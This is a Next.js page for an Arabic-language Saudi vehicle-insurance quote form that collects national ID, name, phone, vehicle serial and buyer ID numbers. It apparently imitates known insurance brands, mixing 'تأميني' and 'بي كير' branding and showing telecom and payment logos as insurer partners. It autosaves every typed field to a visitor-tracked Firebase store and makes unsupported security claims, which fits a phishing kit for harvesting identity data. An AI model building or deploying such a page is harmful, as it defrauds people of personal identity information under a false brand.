"use client";
import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  getOrCreateVisitorID,
} from "@/lib/visitor-tracking";
import { addData } from "@/lib/firebase";
import { useAutoSave } from "@/hooks/use-auto-save";
import {
  RefreshCw, Loader2, Car, Stethoscope, ShieldAlert, Plane,
  ShieldCheck, BadgeCheck, Phone, MessageCircle, ChevronDown,
  Instagram, Youtube, X, Star, Clock, Building2, Users,
  HeadphonesIcon, ArrowLeft, CreditCard, Hash, User, Smartphone,
  CheckCircle2, TrendingUp, Award, Zap, Shield, Globe, Menu,
} from "lucide-react";
import { VehicleDropdownOption } from "@/lib/v-types";

function generateCaptcha() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

function validateSaudiId(id: string): { valid: boolean; error: string } {
  const cleanId = id.replace(/\s/g, "");
  if (!/^\d{10}$/.test(cleanId)) return { valid: false, error: "رقم الهوية يجب أن يتكون من 10 أرقام" };
  if (!/^[12]/.test(cleanId)) return { valid: false, error: "رقم الهوية يجب أن يبدأ بـ 1 أو 2" };
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = Number.parseInt(cleanId[i]);
    if ((10 - i) % 2 === 0) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
  }
  if (sum % 10 !== 0) return { valid: false, error: "رقم الهوية غير صحيح" };
  return { valid: true, error: "" };
}

export default function Home() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [identityNumber, setIdentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [documentType, setDocumentType] = useState("استمارة");
  const [serialNumber, setSerialNumber] = useState("");
  const [insuranceType, setInsuranceType] = useState("تأمين جديد");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [activeTab, setActiveTab] = useState("مركبات");
  const [captchaCode, setCaptchaCode] = useState(generateCaptcha());
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaError, setCaptchaError] = useState(false);
  const [identityNumberError, setIdentityNumberError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>([]);
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
  const [selectedVehicle, setSelectedVehicle] = useState<VehicleDropdownOption | null>(null);
  const [serialFieldFocused, setSerialFieldFocused] = useState(false);
  const [visitorInitialized, setVisitorInitialized] = useState(false);

  useEffect(() => {
    if (!visitorID) return;
    setVisitorInitialized(true);
  }, [visitorID]);

  useAutoSave({
    visitorId: visitorInitialized ? visitorID : "",
    pageName: "home",
    data: { identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber },
  });

  const fetchVehicles = useCallback(async (nin: string) => {
    if (!validateSaudiId(nin).valid) { setVehicleOptions([]); return; }
    setIsLoadingVehicles(true);
    setVehicleOptions([]);
    try {
      const res = await fetch(`/api/vehicles/${nin}`);
      const data = await res.json();
      if (data.success && data.vehicles?.length > 0) {
        const options: VehicleDropdownOption[] = data.vehicles.map((v: any) => ({
          value: v.sequenceNumber || v.SequenceNumber || String(v.vehicleId || ""),
          label: `${v.sequenceNumber || v.SequenceNumber || ""} - ${v.vehicleMaker || v.VehicleMaker || ""} ${v.vehicleModel || v.VehicleModel || ""} ${v.modelYear || v.ModelYear || ""}`.trim(),
          vehicle: v,
        }));
        setVehicleOptions(options);
        setSerialFieldFocused(true);
      }
    } catch (e) { console.error(e); } finally { setIsLoadingVehicles(false); }
  }, []);

  useEffect(() => {
    if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) fetchVehicles(identityNumber);
    else { setVehicleOptions([]); setSelectedVehicle(null); }
  }, [identityNumber, fetchVehicles]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const v = validateSaudiId(identityNumber);
    if (!v.valid) { setIdentityNumberError(v.error); return; }
    if (captchaInput !== captchaCode) { setCaptchaError(true); return; }
    setSubmitting(true);
    try {
      localStorage.setItem("homeFormData", JSON.stringify({ identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber, activeTab, selectedVehicle, timestamp: new Date().toISOString() }));
      await addData({ id: visitorID, identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName: insuranceType === "نقل ملكية" ? buyerName : "", buyerIdNumber: insuranceType === "نقل ملكية" ? buyerIdNumber : "", activeTab, selectedVehicle: selectedVehicle ? { value: selectedVehicle.value, label: selectedVehicle.label } : null, currentStep: 2, currentPage: "insur" });
    } catch (e) { console.error(e); }
    router.push("/insur");
  };

  const productTabs = [
    { label: "مركبات", icon: Car },
    { label: "طبي", icon: Stethoscope },
    { label: "أخطاء طبية", icon: ShieldAlert },
    { label: "سفر", icon: Plane },
  ];

  const features = [
    { icon: Zap, label: "سريع", desc: "احصل على عرضك في 3 دقائق", color: "from-blue-400 to-orange-400" },
    { icon: ShieldCheck, label: "آمن", desc: "بياناتك محمية ومشفرة", color: "from-emerald-400 to-teal-500" },
    { icon: Award, label: "موثوق", desc: "مرخص من الجهات الرسمية", color: "from-blue-400 to-indigo-500" },
    { icon: TrendingUp, label: "أفضل سعر", desc: "نقارن من +25 شركة", color: "from-purple-400 to-pink-500" },
  ];

  return (
    <div className="min-h-screen bg-[#f5f7fa]" dir="rtl">

      {/* ── Header ─────────────────────────────────────── */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
        <div className="max-w-md mx-auto flex items-center justify-between px-4 py-3">
          {/* Left: login + globe */}
          <div className="flex items-center gap-2">
            <button className="rounded-xl bg-[#1976d2] text-white px-3 py-1.5 text-xs font-bold hover:bg-[#1565c0] transition-colors">
              تسجيل الدخول
            </button>
            <Globe className="h-4 w-4 text-slate-400" />
          </div>
          {/* Right: logo */}
          <div className="flex items-center gap-2">
            <Menu className="h-5 w-5 text-slate-500" />
            <span className="text-lg font-black text-[#1976d2]">تأميني</span>
            <Shield className="h-6 w-6 text-[#1976d2]" strokeWidth={2} />
          </div>
        </div>
      </header>

      {/* ── Hero ───────────────────────────────────────── */}
      <section className="relative overflow-hidden bg-gradient-to-br from-[#0d47a1] via-[#1565c0] to-[#1976d2]">
        {/* Decorative blobs */}
        <div className="absolute top-0 left-0 w-64 h-64 bg-white/5 rounded-full -translate-x-1/2 -translate-y-1/2 blur-3xl" />
        <div className="absolute bottom-0 right-0 w-80 h-80 bg-[#1976d2]/10 rounded-full translate-x-1/3 translate-y-1/3 blur-3xl" />
        <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-blue-400/10 rounded-full blur-2xl" />

        {/* Grid pattern overlay */}
        <div className="absolute inset-0 opacity-5"
          style={{ backgroundImage: "radial-gradient(circle, #fff 1px, transparent 1px)", backgroundSize: "24px 24px" }} />

        <div className="relative max-w-md mx-auto px-5 pt-10 pb-20 text-center space-y-5">
          {/* Badge */}
          <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm border border-white/20 rounded-full px-4 py-2">
            <span className="w-2 h-2 rounded-full bg-[#1976d2] animate-pulse" />
            <span className="text-[11px] font-bold text-white/90">منصة تأمين السيارات رقم 1 في السعودية</span>
          </div>

          {/* Headline */}
          <div className="space-y-1">
            <h1 className="text-3xl font-black text-white leading-tight">
              أمّن مركبتك
            </h1>
            <h1 className="text-3xl font-black leading-tight">
              <span className="text-blue-200">بأفضل عرض</span>
              <span className="text-white"> تأمين</span>
            </h1>
          </div>

          <p className="text-sm text-white/60 leading-relaxed max-w-[260px] mx-auto">
            قارن بين أكثر من 25 شركة تأمين معتمدة واحصل على أفضل سعر فورًا
          </p>

          {/* Inline stats */}
          <div className="flex items-center justify-center gap-5 pt-1">
            {[["500K+", "عميل"], ["+25", "شركة"], ["3د", "فقط"]].map(([v, l]) => (
              <div key={l} className="text-center">
                <p className="text-base font-black text-white">{v}</p>
                <p className="text-[10px] text-white/50 font-medium">{l}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── Form card — overlaps hero ───────────────────── */}
      <div className="max-w-md mx-auto px-4 -mt-12 relative z-10 pb-6 space-y-4">

        <div className="bg-white rounded-3xl shadow-2xl shadow-slate-200 overflow-hidden border border-slate-100">

          {/* Card top strip */}
          <div className="h-1 bg-gradient-to-l from-[#1976d2] via-[#1976d2] to-[#1976d2]" />

          {/* Product tabs */}
          <div className="flex border-b border-slate-100 bg-slate-50/50">
            {productTabs.map(({ label, icon: Icon }) => (
              <button
                key={label}
                type="button"
                onClick={() => setActiveTab(label)}
                className={`flex-1 flex flex-col items-center gap-1.5 py-3 text-[11px] font-bold transition-all ${
                  activeTab === label
                    ? "bg-white text-[#1976d2] shadow-sm border-b-2 border-[#1976d2]"
                    : "text-slate-400 hover:text-slate-600 hover:bg-white/50"
                }`}
              >
                <Icon className="w-4 h-4" />
                {label}
              </button>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="p-5 space-y-4">
            {/* Section label */}
            <div className="flex items-center gap-2">
              <div className="flex-1 h-px bg-slate-100" />
              <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">البيانات الأساسية</span>
              <div className="flex-1 h-px bg-slate-100" />
            </div>

            {/* Insurance type pill toggle */}
            <div className="bg-slate-100 rounded-2xl p-1 flex gap-1">
              {["تأمين جديد", "نقل ملكية"].map((type) => (
                <button key={type} type="button" onClick={() => setInsuranceType(type)}
                  className={`flex-1 py-2.5 rounded-xl text-sm font-black transition-all duration-200 ${
                    insuranceType === type
                      ? "bg-[#1976d2] text-white shadow-lg shadow-[#1976d2]/30 scale-[1.01]"
                      : "text-slate-500 hover:text-slate-700"
                  }`}>
                  {type}
                </button>
              ))}
            </div>

            {/* Identity field */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-600">رقم الهوية / الإقامة</label>
              <div className="relative">
                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                  <CreditCard className="w-3.5 h-3.5 text-[#1976d2]" />
                </div>
                <Input
                  type="tel" inputMode="numeric"
                  placeholder="1xxxxxxxxx"
                  value={identityNumber}
                  onChange={(e) => { setIdentityNumber(e.target.value.replace(/\D/g,"").slice(0,10)); if(identityNumberError) setIdentityNumberError(""); }}
                  className={`h-12 rounded-xl border-2 text-sm text-right pr-12 transition-all ${identityNumberError ? "border-red-400 bg-red-50" : "border-slate-200 focus:border-[#1976d2] bg-slate-50 focus:bg-white"}`}
                  dir="rtl" required
                />
                {isLoadingVehicles && <Loader2 className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 animate-spin text-[#1976d2]" />}
                {identityNumber.length === 10 && !isLoadingVehicles && !identityNumberError && (
                  <CheckCircle2 className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
                )}
              </div>
              {identityNumberError && <p className="text-xs text-red-600 font-medium flex items-center gap-1">⚠ {identityNumberError}</p>}
            </div>

            {/* Owner name */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-600">اسم المالك</label>
              <div className="relative">
                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                  <User className="w-3.5 h-3.5 text-[#1976d2]" />
                </div>
                <Input
                  placeholder="الاسم الثلاثي كاملاً"
                  value={ownerName}
                  onChange={(e) => setOwnerName(e.target.value)}
                  className="h-12 rounded-xl border-2 border-slate-200 focus:border-[#1976d2] bg-slate-50 focus:bg-white text-sm text-right pr-12 transition-all"
                  dir="rtl" required
                />
              </div>
            </div>

            {/* Phone */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-600">رقم الجوال</label>
              <div className="relative">
                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                  <Smartphone className="w-3.5 h-3.5 text-[#1976d2]" />
                </div>
                <Input
                  type="tel" inputMode="numeric"
                  placeholder="05xxxxxxxx"
                  value={phoneNumber}
                  onChange={(e) => { const c = e.target.value.replace(/\D/g,""); setPhoneNumber(c.slice(0,10)); }}
                  className="h-12 rounded-xl border-2 border-slate-200 focus:border-[#1976d2] bg-slate-50 focus:bg-white text-sm text-right pr-12 transition-all"
                  dir="rtl" required
                />
              </div>
            </div>

            {/* Transfer fields */}
            {insuranceType === "نقل ملكية" && (
              <div className="space-y-3 bg-blue-50 border border-blue-200 rounded-2xl p-3">
                <p className="text-xs font-bold text-blue-700">بيانات المشتري</p>
                <div className="relative">
                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-blue-100 flex items-center justify-center">
                    <User className="w-3.5 h-3.5 text-blue-600" />
                  </div>
                  <Input placeholder="اسم المشتري الكامل" value={buyerName} onChange={(e) => setBuyerName(e.target.value)}
                    className="h-12 rounded-xl border-2 border-blue-200 focus:border-blue-400 bg-white text-sm text-right pr-12" dir="rtl" required />
                </div>
                <div className="relative">
                  <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-blue-100 flex items-center justify-center">
                    <CreditCard className="w-3.5 h-3.5 text-blue-600" />
                  </div>
                  <Input type="tel" inputMode="numeric" placeholder="رقم هوية المشتري" value={buyerIdNumber}
                    onChange={(e) => setBuyerIdNumber(e.target.value.replace(/\D/g,"").slice(0,10))}
                    className="h-12 rounded-xl border-2 border-blue-200 focus:border-blue-400 bg-white text-sm text-right pr-12" dir="rtl" required />
                </div>
              </div>
            )}

            {/* Divider */}
            <div className="flex items-center gap-2">
              <div className="flex-1 h-px bg-slate-100" />
              <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">بيانات المركبة</span>
              <div className="flex-1 h-px bg-slate-100" />
            </div>

            {/* Document type */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-600">نوع الوثيقة</label>
              <div className="grid grid-cols-2 gap-2">
                {["استمارة", "بطاقة جمركية"].map((t) => (
                  <button key={t} type="button" onClick={() => setDocumentType(t)}
                    className={`h-11 rounded-xl text-sm font-bold border-2 transition-all ${
                      documentType === t
                        ? "border-[#1976d2] bg-[#1976d2] text-white shadow-md shadow-[#1976d2]/20"
                        : "border-slate-200 text-slate-500 hover:border-[#1976d2]/50 hover:text-[#1976d2]"
                    }`}>
                    {t}
                  </button>
                ))}
              </div>
            </div>

            {/* Serial number */}
            <div className="space-y-1.5">
              <label className="block text-xs font-bold text-slate-600">
                {documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
              </label>
              <div className="relative">
                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                  <Hash className="w-3.5 h-3.5 text-[#1976d2]" />
                </div>
                <Input
                  type="tel" inputMode="numeric"
                  placeholder={documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
                  value={serialNumber}
                  onChange={(e) => { setSerialNumber(e.target.value.replace(/\D/g,"")); setSelectedVehicle(null); }}
                  onFocus={() => { if (vehicleOptions.length > 0) setSerialFieldFocused(true); }}
                  onBlur={() => { setTimeout(() => setSerialFieldFocused(false), 200); }}
                  className="h-12 rounded-xl border-2 border-slate-200 focus:border-[#1976d2] bg-slate-50 focus:bg-white text-sm text-right pr-12 transition-all"
                  dir="rtl" required
                />
                {vehicleOptions.length > 0 && !isLoadingVehicles && (
                  <button type="button" className="absolute left-3.5 top-1/2 -translate-y-1/2" onClick={() => setSerialFieldFocused(!serialFieldFocused)}>
                    <ChevronDown className={`h-4 w-4 text-[#1976d2] transition-transform ${serialFieldFocused ? "rotate-180" : ""}`} />
                  </button>
                )}
              </div>

              {selectedVehicle && !serialFieldFocused && (
                <div className="rounded-xl bg-emerald-50 border border-emerald-200 px-3.5 py-2.5">
                  <p className="text-[10px] text-emerald-600 font-bold mb-0.5">✓ المركبة المختارة</p>
                  <p className="text-sm font-semibold text-slate-700">{selectedVehicle.label}</p>
                </div>
              )}

              {serialFieldFocused && vehicleOptions.length > 0 && (
                <div className="absolute z-50 mt-1 w-[calc(100%-2rem)] rounded-2xl border border-slate-200 bg-white shadow-2xl overflow-hidden" dir="rtl">
                  <div className="max-h-52 overflow-y-auto divide-y divide-slate-50">
                    {vehicleOptions.map((opt) => (
                      <button key={opt.value} type="button"
                        className={`w-full px-4 py-3 text-right text-sm hover:bg-blue-50 transition-colors flex items-center justify-between ${serialNumber === opt.value ? "bg-blue-50 text-[#1976d2] font-bold" : "text-slate-700"}`}
                        onMouseDown={(e) => { e.preventDefault(); setSerialNumber(opt.value); setSelectedVehicle(opt); setSerialFieldFocused(false); }}>
                        <span className="text-xs text-slate-400">{opt.value}</span>
                        <span>{opt.label}</span>
                      </button>
                    ))}
                  </div>
                  <button type="button" className="w-full px-4 py-2.5 text-center text-xs text-slate-400 hover:bg-slate-50 border-t border-slate-100 font-medium"
                    onMouseDown={(e) => { e.preventDefault(); setSerialFieldFocused(false); setSerialNumber(""); setSelectedVehicle(null); }}>
                    إدخال رقم يدوياً
                  </button>
                </div>
              )}
            </div>

            {/* Captcha */}
            <div className="rounded-2xl bg-slate-50 border-2 border-dashed border-slate-200 p-3.5 space-y-2.5">
              <div className="flex items-center gap-2">
                <span className="text-xs font-bold text-slate-500">رمز التحقق الأمني</span>
                <div className="flex-1 h-px bg-slate-200" />
                <button type="button" onClick={() => { setCaptchaCode(generateCaptcha()); setCaptchaInput(""); setCaptchaError(false); }}
                  className="flex items-center gap-1 text-[10px] font-bold text-[#1976d2] hover:text-[#1565c0]">
                  <RefreshCw className="h-3 w-3" /> تحديث
                </button>
              </div>
              <div className="flex items-stretch gap-2">
                <div className="flex items-center gap-2 bg-white rounded-xl border-2 border-slate-200 px-4 py-2.5 flex-shrink-0" dir="ltr">
                  {captchaCode.split("").map((d, i) => (
                    <span key={i} className={`text-2xl font-black select-none font-mono ${i % 2 === 0 ? "text-[#1976d2]" : "text-[#1976d2]"}`}
                      style={{ letterSpacing: "0.05em", textDecoration: i === 1 ? "line-through" : "none", transform: `rotate(${(i - 1.5) * 4}deg)`, display: "inline-block" }}>
                      {d}
                    </span>
                  ))}
                </div>
                <Input
                  placeholder="أدخل الرمز"
                  value={captchaInput}
                  onChange={(e) => { setCaptchaInput(e.target.value); if (captchaError) setCaptchaError(false); }}
                  className={`flex-1 h-full min-h-[48px] rounded-xl border-2 text-sm text-center font-bold tracking-widest ${captchaError ? "border-red-400 bg-red-50 text-red-700" : "border-slate-200 focus:border-[#1976d2]"}`}
                  required
                />
              </div>
              {captchaError && <p className="text-xs text-red-600 font-bold">⚠ الرمز غير صحيح، يرجى المحاولة مجدداً</p>}
            </div>

            {/* CTA Button */}
            <button
              type="submit"
              disabled={submitting}
              className="w-full h-14 rounded-2xl font-black text-base transition-all duration-200 relative overflow-hidden group disabled:opacity-70"
              style={{ background: "linear-gradient(135deg, #1976d2 0%, #e09a18 50%, #1976d2 100%)", backgroundSize: "200% 100%", color: "#1a3d52", boxShadow: "0 8px 24px rgba(244,173,39,0.4)" }}
            >
              {submitting
                ? <Loader2 className="h-6 w-6 animate-spin mx-auto" />
                : <span className="flex items-center justify-center gap-3">
                    <span>احصل على عرضك الآن</span>
                    <div className="w-7 h-7 rounded-xl bg-[#1a3d52]/20 flex items-center justify-center">
                      <ArrowLeft className="h-4 w-4" />
                    </div>
                  </span>
              }
            </button>

            <div className="flex items-center justify-center gap-4 text-[10px] text-slate-400">
              <span className="flex items-center gap-1">🔒 بيانات مشفرة</span>
              <span className="flex items-center gap-1">✅ مجاناً تماماً</span>
              <span className="flex items-center gap-1">⚡ نتيجة فورية</span>
            </div>
          </form>
        </div>

        {/* ── Feature cards ──────────────────────────────── */}
        <div className="grid grid-cols-2 gap-3">
          {features.map(({ icon: Icon, label, desc, color }) => (
            <div key={label} className="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 space-y-2.5">
              <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${color} flex items-center justify-center shadow-md`}>
                <Icon className="w-5 h-5 text-white" />
              </div>
              <div>
                <p className="text-sm font-black text-slate-800">{label}</p>
                <p className="text-[11px] text-slate-500 leading-4 mt-0.5">{desc}</p>
              </div>
            </div>
          ))}
        </div>

        {/* ── Company logos ──────────────────────────────── */}
        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-4">
          <p className="text-xs font-bold text-slate-400 text-center mb-3 uppercase tracking-wider">شركاؤنا من شركات التأمين</p>
          <div className="grid grid-cols-4 gap-2">
            {["/stc.png", "/Mobily_Logo.svg", "/mada.svg", "/tan.svg", "/mas.svg", "/sxs.svg", "/rhj.png", "/NIC-logo.png"].map((src, i) => (
              <div key={i} className="h-11 bg-slate-50 rounded-xl border border-slate-100 flex items-center justify-center p-2 hover:border-[#1976d2]/30 transition-colors">
                <img src={src} alt="" className="max-h-full max-w-full object-contain opacity-60 hover:opacity-100 transition-opacity"
                  onError={(e) => { (e.target as HTMLImageElement).parentElement!.style.display = "none"; }} />
              </div>
            ))}
          </div>
        </div>

        {/* ── Reviews strip ──────────────────────────────── */}
        <div className="bg-gradient-to-l from-[#1976d2] to-[#1565c0] rounded-2xl p-4 text-white">
          <div className="flex items-center justify-between mb-3">
            <div>
              <p className="text-sm font-black">+500,000 عميل راضٍ</p>
              <p className="text-[10px] text-white/60 mt-0.5">يثقون بخدماتنا يومياً</p>
            </div>
            <div className="text-left">
              <div className="flex items-center gap-0.5 mb-0.5">
                {[1,2,3,4,5].map(i => <Star key={i} className="w-3.5 h-3.5 fill-[#1976d2] text-[#1976d2]" />)}
              </div>
              <p className="text-[10px] text-white/60">4.9 / 5.0 تقييم</p>
            </div>
          </div>
          <div className="grid grid-cols-3 gap-2">
            {[["98%","رضى العملاء"], ["24/7","دعم متواصل"], ["‎<3د","متوسط الإتمام"]].map(([v, l]) => (
              <div key={l} className="bg-white/10 rounded-xl py-2.5 text-center border border-white/10">
                <p className="text-base font-black text-white">{v}</p>
                <p className="text-[10px] text-white/60 font-medium mt-0.5">{l}</p>
              </div>
            ))}
          </div>
        </div>

        {/* ── Help ───────────────────────────────────────── */}
        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-4 space-y-3">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-[#1976d2]/10 flex items-center justify-center">
              <HeadphonesIcon className="w-5 h-5 text-[#1976d2]" />
            </div>
            <div>
              <p className="text-sm font-black text-slate-800">هل تحتاج مساعدة؟</p>
              <p className="text-[11px] text-slate-500">فريقنا متاح على مدار الساعة</p>
            </div>
          </div>
          <div className="grid grid-cols-2 gap-2">
            <a href="tel:920000000" className="flex items-center justify-center gap-2 h-11 border-2 border-[#1976d2] text-[#1976d2] rounded-xl text-sm font-bold hover:bg-[#1976d2] hover:text-white transition-all">
              <Phone className="h-4 w-4" /> اتصل بنا
            </a>
            <a href="#" className="flex items-center justify-center gap-2 h-11 bg-[#25d366] text-white rounded-xl text-sm font-bold hover:bg-[#1eb956] transition-all shadow-md shadow-green-200">
              <MessageCircle className="h-4 w-4" /> واتساب
            </a>
          </div>
        </div>

      </div>

      {/* ── Footer ─────────────────────────────────────── */}
      <footer className="bg-[#0d47a1] text-white">
        <div className="max-w-md mx-auto px-4 pt-7 pb-6">
          {/* Brand */}
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center">
              <img src="/logo-0.svg" alt="بي كير" className="h-10 w-auto brightness-0 invert" />
            </div>
            <a href="tel:8001180044" className="bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl px-3 py-2 transition-colors">
              <p className="text-[10px] text-white/60 font-medium mb-0.5">الدعم المجاني</p>
              <p className="text-sm font-black text-[#1976d2]">800 118 0044</p>
            </a>
          </div>

          {/* Links */}
          <div className="grid grid-cols-2 gap-4 mb-6 pb-6 border-b border-white/10">
            {[
              { title: "الخدمات", links: ["تأمين السيارات", "تأمين طبي", "تأمين سفر", "إدارة الوثيقة"] },
              { title: "الدعم", links: ["مركز المساعدة", "اتصل بنا", "الشروط والأحكام", "الخصوصية"] },
            ].map(({ title, links }) => (
              <div key={title}>
                <p className="text-[10px] font-black text-white/30 uppercase tracking-widest mb-3">{title}</p>
                {links.map((l) => (
                  <button key={l} type="button" className="block text-[11px] text-white/55 hover:text-white py-1 transition-colors font-medium">
                    {l}
                  </button>
                ))}
              </div>
            ))}
          </div>

          {/* Bottom */}
          <div className="flex items-center justify-between">
            <p className="text-[10px] text-white/30">© 2024 بي كير — جميع الحقوق محفوظة</p>
            <div className="flex gap-1.5">
              {[Instagram, X, Youtube].map((Icon, i) => (
                <span key={i} className="w-8 h-8 rounded-xl bg-white/10 hover:bg-white/20 flex items-center justify-center cursor-pointer transition-colors">
                  <Icon className="h-3.5 w-3.5 text-white/70" />
                </span>
              ))}
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
